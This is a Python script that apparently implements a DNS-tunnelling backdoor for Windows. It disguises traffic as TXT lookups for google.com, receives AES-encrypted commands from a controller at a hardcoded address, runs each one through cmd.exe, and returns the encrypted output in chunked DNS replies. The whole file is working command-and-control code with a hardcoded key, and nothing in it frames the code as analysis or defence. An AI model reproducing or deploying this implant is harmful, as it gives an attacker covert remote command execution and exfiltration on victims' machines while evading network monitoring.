from asyncio import subprocess
import socket
import dns.name
import dns.message
import dns.query
from dnslib import DNSRecord, DNSHeader, RR
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from subprocess import PIPE, run, check_output, Popen
import time

class Payload:
    def __init__(self):
        pass

def payload(addr):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,0)
    sock.bind(("192.168.7.202",53))
    query = dns.message.make_query("google.com", dns.rdatatype.TXT)
    dns.query.send_udp(sock, query, (addr,53))
    while 1:
        data,address = sock.recvfrom(512)
        dataList = list(data)
        newDataList = list()
        found = False
        count = 0
        for i in dataList:
            if i == 33:
                found = True
                count += 1
                if count == 2:
                    break
            elif found:
                newDataList.append(i)
        bytesNewDataList = bytearray(newDataList)
        command = decrypting(bytesNewDataList, "hellothisismebob")
        command = command.decode('utf-8')
        command2 = ""
        for i in repr(command):
            if i == "'":
                continue
            elif i == "\\":
                break
            else:
                command2 += i
        result2 = check_output(['cmd.exe', '/c', command2])
        finalResult = encrypting(result2.decode("utf-8"), "hellothisismebob")
        if len(finalResult) >= 250:
            finalResultSeperated = list()
            eachList = ""
            for char in range(len(finalResult)):
                if len(eachList) <= 249 and char != (len(finalResult) - 1):
                    eachList += finalResult[char]
                else:
                    if char == (len(finalResult) - 1):
                        eachList += finalResult[char]
                    eachList += finalResult[char]
                    finalResultSeperated.append(eachList)
                    print(eachList)
                    eachList = ""
            for i in range(len(finalResultSeperated)):
                request = DNSRecord.parse(data)
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                reply.add_answer(*RR.fromZone("google.com TXT " + "!" + finalResultSeperated[i] + "!"))
                resp = reply.pack()
                sock.sendto(resp,(addr,53))

            request = DNSRecord.parse(data)
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(*RR.fromZone("google.com TXT " + "!end!"))
            resp = reply.pack()
            sock.sendto(resp,(addr,53))
            time.sleep(5)
            query = dns.message.make_query("google.com", dns.rdatatype.TXT)
            dns.query.send_udp(sock, query, (addr,53))
        else:
            request = DNSRecord.parse(data)
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(*RR.fromZone("google.com TXT " + "!" + finalResult + "!"))
            resp = reply.pack()
            sock.sendto(resp,(addr,53))
            end = encrypting("end", "hellothisismebob")
            request = DNSRecord.parse(data)
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(*RR.fromZone("google.com TXT " + "!end!"))
            resp = reply.pack()
            sock.sendto(resp,(addr,53))
            time.sleep(5)
            query = dns.message.make_query("google.com", dns.rdatatype.TXT)
            dns.query.send_udp(sock, query, (addr,53))


def encrypting(data,key):
    enc = bytes(key, "utf-8")
    data = data.encode("utf-8")
    length = 16 - (len(data) % 16)
    data += bytes([length])*length
    iv = b'\x9a\x95\xb9\xe9#c\xd9\xa5\x92CG\xf9)\x0e\xf5x'
    cipher = AES.new(enc, AES.MODE_CBC, iv)
    return str(base64.b64encode(cipher.encrypt(data)), 'utf-8')

def decrypting(enc,key):
    enc = base64.b64decode(enc)
    print(enc)
    bl = bytes(key, "utf-8")
    print(bl)
    iv = b'\x9a\x95\xb9\xe9#c\xd9\xa5\x92CG\xf9)\x0e\xf5x'
    cipher = AES.new(bl, AES.MODE_CBC, iv)
    return cipher.decrypt(enc)


payload("192.168.7.168")
